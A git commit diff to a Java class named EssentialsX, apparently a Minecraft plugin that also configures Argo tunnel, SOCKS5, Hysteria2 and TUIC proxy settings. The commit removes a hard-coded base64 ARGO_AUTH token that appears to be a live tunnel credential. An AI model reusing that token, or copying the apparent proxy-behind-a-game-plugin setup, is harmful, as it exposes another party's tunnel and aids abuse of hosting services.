a3590e32d032d54dd6d5794b1c471971657764aa
mzhangxy <96800168+mzhangxy@users.noreply.github.com>
2026-02-21 20:51:10 +0800

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -76,7 +76,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("FILE_PATH", "./world");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "eyJhIjoiZDY1NWNiOTk2NzNlZTYzMDE4NDFkMmQyNmYxNTY5N2EiLCJ0IjoiNGE2NzU5NWEtNGUyNi00YmIxLWJkOGQtYjQwNTUxYWFjZTdmIiwicyI6Ik9XTTRZV1V5WmpFdE5EZGtNUzAwWVdFNExUa3dOR1l0WkRSaVpHRmtaR1l5TW1JeSJ9");
+        env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
